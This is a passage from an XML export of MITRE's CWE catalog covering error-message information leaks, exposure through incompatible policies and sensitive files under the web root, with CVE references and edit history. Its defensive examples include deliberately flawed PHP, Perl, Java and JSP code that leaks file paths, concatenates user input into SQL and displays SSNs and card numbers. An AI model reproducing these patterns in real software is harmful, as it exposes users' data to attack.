                     <xhtml:br/>catch (Exception $e) {<xhtml:div style="margin-left:1em;">echo 'Caught exception: ', $e-&gt;getMessage(), '\n';<xhtml:br/>echo 'Check credentials in config file at: ', $Mysql_config_location, '\n';</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>If an exception occurs, the printed message exposes the location of the configuration file the script is using. An attacker can use this information to target the configuration file (perhaps exploiting a Path Traversal weakness). If the file can be read, the attacker could gain credentials for accessing the database. The attacker may also be able to replace the file with a malicious one, causing the application to use an arbitrary database.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code generates an error message that leaks the full pathname of the configuration file.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>$ConfigDir = "/home/myprog/config";<xhtml:br/>$uname = GetUserInput("username");<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i># avoid CWE-22, CWE-78, others.</xhtml:i>
                     <xhtml:br/>ExitError("Bad hacker!") if ($uname !~ /^\w+$/);<xhtml:br/>$file = "$ConfigDir/$uname.txt";<xhtml:br/>if (! (-e $file)) {<xhtml:div style="margin-left:1em;">ExitError("Error: $file does not exist");</xhtml:div>}<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>If this code is running on a server, such as a web application, then the person making the request should not know what the full pathname of the configuration directory is. By submitting a username that does not produce a $file that exists, an attacker could get this pathname. It could then be used to exploit path traversal or symbolic link following problems that may exist elsewhere in the application.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-119">
               <Intro_Text>In the example below, the method getUserBankAccount retrieves a bank account object from a database using the supplied username and account number to query the database. If an SQLException is raised when querying the database, an error message is created and output to a log file.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public BankAccount getUserBankAccount(String username, String accountNumber) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>BankAccount userAccount = null;<xhtml:br/>String query = null;<xhtml:br/>try {<xhtml:div style="margin-left:1em;">if (isAuthorizedUser(username)) {<xhtml:div style="margin-left:1em;">query = "SELECT * FROM accounts WHERE owner = "<xhtml:br/>+ username + " AND accountID = " + accountNumber;<xhtml:br/>DatabaseManager dbManager = new DatabaseManager();<xhtml:br/>Connection conn = dbManager.getConnection();<xhtml:br/>Statement stmt = conn.createStatement();<xhtml:br/>ResultSet queryResult = stmt.executeQuery(query);<xhtml:br/>userAccount = (BankAccount)queryResult.getObject(accountNumber);</xhtml:div>}</xhtml:div>} catch (SQLException ex) {<xhtml:div style="margin-left:1em;">String logMessage = "Unable to retrieve account information from database,\nquery: " + query;<xhtml:br/>Logger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex);</xhtml:div>}<xhtml:br/>return userAccount;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The error message that is created includes information about the database query that may contain sensitive information about the database or query logic. In this case, the error message will expose the table name and column names used in the database. This data could be used to simplify other attacks, such as SQL injection (CWE-89) to directly access the database.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2008-2049</Reference>
               <Description>POP3 server reveals a password in an error message after multiple APOP commands are sent. Might be resultant from another weakness.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2049</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5172</Reference>
               <Description>Program reveals password in error message if attacker can trigger certain database errors.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5172</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4638</Reference>
               <Description>Composite: application running with high privileges (CWE-250) allows user to specify a restricted file to process, which generates a parsing error that leaks the contents of the file (CWE-209).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4638</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1579</Reference>
               <Description>Existence of user names can be determined by requesting a nonexistent blog and reading the error message.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1579</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-1409</Reference>
               <Description>Direct request to library file in web application triggers pathname leak in error message.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-1409</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3060</Reference>
               <Description>Malformed input to login page causes leak of full path when IMAP call fails.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3060</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0603</Reference>
               <Description>Malformed regexp syntax leads to information exposure in error message.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0603</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-9615</Reference>
               <Description>verbose logging stores admin credentials in a world-readablelog file</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-9615</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2018-1999036</Reference>
               <Description>SSH password for private key stored in build log</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2018-1999036</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Accidental leaking of sensitive information through error messages</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A6</Entry_ID>
               <Entry_Name>Information Leakage and Improper Error Handling</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A7</Entry_ID>
               <Entry_Name>Improper Error Handling</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A10</Entry_ID>
               <Entry_Name>Insecure Configuration Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>ERR01-J</Entry_ID>
               <Entry_Name>Do not allow exceptions to expose sensitive information</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="215"/>
            <Related_Attack_Pattern CAPEC_ID="463"/>
            <Related_Attack_Pattern CAPEC_ID="54"/>
            <Related_Attack_Pattern CAPEC_ID="7"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-174"/>
            <Reference External_Reference_ID="REF-175" Section="Section 9.2, Page 326"/>
            <Reference External_Reference_ID="REF-176" Section="Chapter 16, &#34;General Good Practices.&#34; Page 415"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 11: Failure to Handle Errors Correctly.&#34; Page 183"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 12: Information Leakage.&#34; Page 191"/>
            <Reference External_Reference_ID="REF-179"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 3, &#34;Overly Verbose Error Messages&#34;, Page 75"/>
            <Reference External_Reference_ID="REF-18"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Name, Observed_Examples, Other_Notes, Potential_Mitigations, Relationships, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Name, Potential_Mitigations, References, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Detection_Factors, Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2010-09-09</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Description, Name, Observed_Examples, References, Relationships, Weakness_Ordinalities</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Contribution Type="Feedback">
			      <Contribution_Name>Nick Johnston</Contribution_Name>
			      <Contribution_Date>2022-07-11</Contribution_Date>
			      <Contribution_Comment>Identified incorrect language tag in demonstrative example.</Contribution_Comment>
			   </Contribution>
            <Previous_Entry_Name Date="2009-01-12">Error Message Information Leaks</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-12-28">Error Message Information Leak</Previous_Entry_Name>
			<Previous_Entry_Name Date="2020-02-24">Information Exposure Through an Error Message</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="213" Name="Exposure of Sensitive Information Due to Incompatible Policies" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product's intended functionality exposes information to certain actors in accordance with the developer's security policy, but this information is regarded as sensitive according to the intended security policies of other stakeholders such as the product's administrator, users, or others whose information is being processed.</Description>
         <Extended_Description>
	   <xhtml:p>When handling information, the developer must consider whether the information is regarded as sensitive by different stakeholders, such as users or administrators.  Each stakeholder effectively has its own intended security policy that the product is expected to uphold.  When a developer does not treat that information as sensitive, this can introduce a vulnerability that violates the expectations of the product's users.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="200" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Policy</Phase>
	       <Note>This can occur when the product's policy does not account for all relevant stakeholders, or when the policies of other stakeholders are not interpreted properly.</Note>
            </Introduction>
            <Introduction>
               <Phase>Requirements</Phase>
	       <Note>This can occur when requirements do not explicitly account for all relevant stakeholders.</Note>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
	       <Note>Communications or data exchange frameworks may be chosen that exchange or provide access to more information than strictly needed.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
	       <Note>This can occur when the developer does not properly track the flow of sensitive information and how it is exposed, e.g., via an API.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-130">
               <Intro_Text>This code displays some information on a web page.</Intro_Text>
               <Example_Code Nature="Bad" Language="JSP">
                  <xhtml:div>Social Security Number: &lt;%= ssn %&gt;&lt;/br&gt;Credit Card Number: &lt;%= ccn %&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The code displays a user's credit card and social security numbers, even though they aren't absolutely necessary.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2002-1725</Reference>
               <Description>Script calls phpinfo()</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1725</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0033</Reference>
               <Description>Script calls phpinfo()</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0033</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-1181</Reference>
               <Description>Script calls phpinfo()</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-1181</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1422</Reference>
               <Description>Script calls phpinfo()</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1422</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-1590</Reference>
               <Description>Script calls phpinfo()</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-1590</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-1038</Reference>
               <Description>Product lists DLLs and full pathnames.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-1038</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1205</Reference>
               <Description>Telnet protocol allows servers to obtain sensitive environment information from clients.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1205</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0488</Reference>
               <Description>Telnet protocol allows servers to obtain sensitive environment information from clients.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0488</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Intended information leak</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Notes>
	   <Note Type="Maintenance">This entry is being considered for deprecation.  It overlaps many other entries related to information exposures.  It might not be essential to preserve this entry, since other key stakeholder policies are covered elsewhere, e.g. personal privacy leaks (CWE-359) and system-level exposures that are important to system administrators (CWE-497).</Note>
            <Note Type="Theoretical">In vulnerability theory terms, this covers cases in which the developer's Intended Policy allows the information to be made available, but the information might be in violation of a Universal Policy in which the product's administrator should have control over which information is considered sensitive and therefore should not be exposed.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Other_Notes, Relationship_Notes, Theoretical_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description, Maintenance_Notes, Modes_of_Introduction, Name, Other_Notes, Relationship_Notes, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2011-03-29">Intended Information Leak</Previous_Entry_Name>
			<Previous_Entry_Name Date="2020-02-24">Intentional Information Exposure</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="219" Name="Storage of File with Sensitive Data Under Web Root" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The product stores sensitive data under the web document root with insufficient access control, which might make it accessible to untrusted parties.</Description>
	 <Extended_Description>
	   Besides public-facing web pages and code, products may store sensitive data, code that is not directly invoked, or other files under the web document root of the web server.  If the server is not configured or otherwise used to prevent direct access to those files, then attackers may obtain this sensitive data.
	 </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="552" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Operation</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Phase>System Configuration</Phase>
               <Description>Avoid storing information under the web root directory.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Description>Access control permissions should be set to prevent reading/writing of sensitive files inside/outside of the web directory.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2005-1835</Reference>
               <Description>Data file under web root.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1835</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2217</Reference>
               <Description>Data file under web root.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2217</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1449</Reference>
               <Description>Username/password in data file under web root.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1449</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0943</Reference>
               <Description>Database file under web root.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0943</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1645</Reference>
               <Description>database file under web root.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1645</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Sensitive Data Under Web Root</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A10</Entry_ID>
               <Entry_Name>Insecure Configuration Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Description, Name, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
